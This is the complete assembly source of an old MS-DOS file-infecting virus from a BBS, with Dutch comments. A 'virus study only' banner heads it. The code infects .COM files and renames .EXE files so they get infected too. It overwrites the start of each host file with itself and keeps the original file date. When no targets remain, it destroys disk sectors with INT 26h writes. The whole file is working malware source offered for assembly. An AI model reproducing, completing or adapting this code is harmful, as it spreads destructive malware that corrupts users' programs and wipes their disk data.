

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
        page  70,120
        Name  VIRUS
;**************************************************************************
;       Programma:  Virus               Versie:         1.2
;       Copyright by Hanx 1992
;       No modifications please !
;**************************************************************************

code    segment
        assume  cs:code
progr   equ     100h
        org     progr

;**************************************************************************
;       De drie nop's dienen voor `Virus' als kenteken-
;       bytes waaraan een besmet programma herkenbaar is.
;**************************************************************************
Main:   nop
        nop
        nop
;**************************************************************************
;       Pointers initialiseren.
;**************************************************************************
        mov     ax,00
        mov     es:[pointer],ax
        mov     es:[counter],ax
        mov     es:[disks],al
;**************************************************************************
;       Opvragen actuele diskdrive.
;**************************************************************************
        mov     ah,19h                  ; drive?
        int     21h
;**************************************************************************
;       Opvragen actuele pad.
;**************************************************************************
        mov     cs:drive,al             ; save drive
        mov     ah,47h                  ; dir?
        mov     dh,0
        add     al,1
        mov     dl,al                   ; in actual drive
        lea     si,cs:old_path
        int     21h
;**************************************************************************
;       Aantal aanwezige diskdrives opvragen. Als er maar
;       een diskdrive aanwezig is, wordt de pointer voor
;       `search_order' verlegd naar `search_order +6'.
;**************************************************************************
        mov     ah,0eh
        mov     dl,0
        int     21h

        mov     al,01
        cmp     al,01                   ; one drive?
        jnz     hups3
        mov     al,06

hups3:  mov     ah,0
        lea     bx,search_order
        add     bx,ax
        add     bx,0001h
        mov     cs:pointer,bx
        clc
;**************************************************************************
;       De carry-flag is gezet als de zoektocht geen .COM meer
;       oplevert. Om het eenvoudig te houden krijgen de
;       .EXE bestanden de extensie .COM om te worden besmet.
;       Dat heeft tot gevolg dat starten van een groot besmet
;       .EXE-programma een foutmelding veroorzaakt:
;       `Program too big to fit in memory'.
;**************************************************************************
change_disk:
        jnc     no_name_change
        mov     ah,17h                  ; change .EXE to .COM
        lea     dx,cs:mask_exe
        int     21h
        cmp     al,0ffh
        jnz     no_name_change          ; .EXE found?
;**************************************************************************
;       Als geen .COM- of .EXE-bestand is te vinden, worden
;       sectoren overschreven, afhankelijk van de systeem-
;       tijd in het msec-bereik. Dit is het moment van de
;       complete besmetting van het opslagmedium.
;       `Virus' vindt geen aangrijpingspunten meer en begint
;       met de vernieling ervan.
;**************************************************************************
        mov     ah,2ch                  ; read system clock
        int     21h
        mov     bx,cs:pointer
        mov     al,cs:[bx]
        mov     bx,dx
        mov     cx,2
        mov     dh,0
        int     26h                     ; write shit on disk (gna,gna,gna)
;**************************************************************************
;       Testen of het einde van de zoekprocedure of van
;       de tabel is bereikt. Zo ja; beeindigen
;**************************************************************************
no_name_change:
        mov     bx,cs:pointer
        dec     bx
        mov     cs:pointer,bx
        mov     dl,cs:[bx]
        cmp     dl,0ffh
        jnz     hups2
        jmp     hops
;**************************************************************************
;       Nieuwe drive ophalen uit de lijst met de
;       search order en deze actueel maken.
;**************************************************************************
hups2:
        mov     ah,0eh
        int     21h                     ; change disk
;**************************************************************************
;       Beginnen hoofddirectory.
;**************************************************************************
        mov     ah,3bh                  ; change path
        lea     dx,path
        int     21h
        jmp     find_first_file
;**************************************************************************
;       Uitgaande van de hoofddir., zoeken naar de eerste
;       subdir. Voorafgaand in de oude directory alle .EXE-
;       files veranderen in .COM-files.
;**************************************************************************
find_first_subdir:
        mov     ah,17h                  ; change .EXE to .COM
        lea     dx,cs:mask_exe
        int     21h
        mov     ah,3bh                  ; use root dir
        lea     dx,path
        int     21h
        mov     ah,04eh                 ; search for first subdir.
        mov     cx,00010001b            ; dir mask
        lea     dx,mask_dir
        int     21h
        jc      change_disk

        mov     bx,cs:counter
        inc     bx
        dec     bx
        jz      use_next_subdir
;**************************************************************************
;       Zoeken naar volgende subdir's. Overschakelen
;       naar andere drive als er geen directory meer is te
;       vinden.
;**************************************************************************
find_next_subdir:
        mov     ah,4fh                  ; search for next subdir.
        int     21h
        jc      change_disk
        dec     bx
        jnz     find_next_subdir
;**************************************************************************
;       Gevonden directory actueel maken.
;**************************************************************************
use_next_subdir:
        mov     ah,2fh                  ; get DTA adress
        int     21h
        add     bx,1ch
        mov     es:[bx],ax              ; address of name in DTA
        inc     bx
        push    ds
        mov     ax,es
        mov     ds,ax
        mov     dx,bx
        mov     ah,3bh                  ; change path
        int     21h
        pop     ds
        mov     bx,cs:counter
        inc     bx
        mov     cs:counter,bx
;**************************************************************************
;       Eerste .COM file zoeken in actuele directory
;       Geen aanwezig, dan volgende directory zoeken.
;**************************************************************************
find_first_file:
        mov     ah,04eh                 ; search for first
        mov     cx,00000001b            ; mask
        lea     dx,mask_com
        int     21h
        jc      find_first_subdir
        jmp     check_if_ill
;**************************************************************************
;       Programma al besmet, dan volgend programma zoeken.
;**************************************************************************
find_next_file:
        mov     ah,4fh                  ; search for next
        int     21h
        jc      find_first_subdir
;**************************************************************************
;       Test op besmetting.
;**************************************************************************
check_if_ill:
        mov     ah,3dh                  ; open channel
        mov     al,02h                  ; read/write
        mov     dx,9eh                  ; address of name in DTA
        int     21h
        mov     bx,ax                   ; save channel
        mov     ah,3fh                  ; read file
        mov     cx,buflen
        mov     dx,buffer               ; write in buffer
        int     21h
        mov     ah,3eh                  ; close file
        int     21h
;**************************************************************************
;       Test op drie nop's van `Virus'.
;       Indien aanwezig, is het programma al besmet:
;       verder zoeken.
;**************************************************************************
        mov     bx,cs:[buffer]
        cmp     bx,9090h
        jz      find_next_file
;**************************************************************************
;       Eventueel aanwezige schrijfbeveiliging van MS-DOS
;       verwijderen.
;**************************************************************************
        mov     ah,43h                  ; write enable
        mov     al,0
        mov     dx,9eh                  ; address of name in DTA
        int     21h
        mov     ah,43h
        mov     al,01h
        and     cx,11111110b
        int     21h
;**************************************************************************
;       Bestand openen voor schrijven/lezen.
;**************************************************************************
        mov     ah,3dh                  ; open channel
        mov     al,02h                  ; read/write
        mov     dx,9eh                  ; address of name in DTA
        int     21h
;**************************************************************************
;       Datum van het bestand opslaan voor later gebruik.
;**************************************************************************
        mov     bx,ax                   ; channel
        mov     ah,57h                  ; get date
        mov     al,0
        int     21h
        push    cx                      ; save data
        push    dx
;**************************************************************************
;       De sprong die op adres 0100h van het programma
;       staat, wordt ook opgeslagen voor later gebruik.
;**************************************************************************
        mov     dx,cs:[conta]           ; save old jump
        mov     cs:[jmpbuf],dx
        mov     dx,cs:[buffer+1]        ; save new jump
        lea     cx,cont-100h
        sub     dx,cx
        mov     cs:[conta],dx
;**************************************************************************
;       `Virus' kopieert zichzelf naar het begin van het
;       bestand.
;**************************************************************************
        mov     ah,40h                  ; write virus
        mov     cx,buflen               ; length virus
        lea     dx,main                 ; write virus
        int     21h
;**************************************************************************
;       De oude aanmaakdatum van het bestand vermelden.
;**************************************************************************
        mov     ah,57h                  ; write date
        mov     al,1
        pop     dx
        pop     cx                      ; restore data
        int     21h
;**************************************************************************
;       Bestand afsluiten.
;**************************************************************************
        mov     ah,3eh                  ; close file
        int     21h
;**************************************************************************
;       Oud sprongadres herstellen. `Virus' slaat op het
;       adres `conta' de sprong op die aan het begin van
;       het gastheerprogramma stond. Daardoor blijft het
;       gastheerprogramma zoveel mogelijk uitvoerbaar. Na
;       het opslaan werkt het verder met het sprongadres
;       van `Virus'. `Virus' staat dus anders in het
;       werkgeheugen dan in het programma.
;**************************************************************************
        mov     dx,cs:[jmpbuf]          ; restore old jump
        mov     cs:[conta],dx
hops:   nop
        call use_old
;**************************************************************************
;       Verder gaan met gastheerprogramma.
;**************************************************************************
cont    db      0e9h                    ; make jump
conta   dw      0
        mov     ah,00
        int     21h
;**************************************************************************
;       Aan het begin van het programma gekozen diskdrive
;       activeren.
;**************************************************************************
use_old:        
        mov     ah,0eh                  ; use old drive
        mov     dl,cs:drive
        int     21h
;**************************************************************************
;       Aan het begin van het programma gekozen pad weer
;       activeren.
;**************************************************************************
        mov     ah,3bh                  ; use old dir
        lea     dx,old_path-1           ; get old path and backslash
        int     21h
        ret

search_order    db      0ffh,1,0,2,3,0ffh,00,0ffh
pointer         dw      0000            ; pointer f. search order
counter         dw      0000            ; counter f.nth. search
disks           db      0               ; number of disks

mask_com        db      "*.com",00      ; search for com files
mask_dir        db      "*",00          ; search for dir's
mask_exe        db      0ffh,0,0,0,0,0,00111111b
                db      0,"????????exe",0,0,0,0
                db      0,"????????com",0
mask_all        db      0ffh,0,0,0,0,0,00111111b
                db      0,"???????????",0,0,0,0
                db      0,"????????com",0
buffer          equ     0e000h          ; a safe place
buflen          equ     230h            ; length of virus !!!!!!!
                                        ;         care if
                                        ;         changes !!!!!!!
jmpbuf          equ     buffer+buflen   ; a safe place for jmp
path            db      "\",0           ; first path
drive           db      0               ; actual drive
back_slash      db      "\"
old_path        db      32 dup(?)       ; old path        

code    ends

        end     main







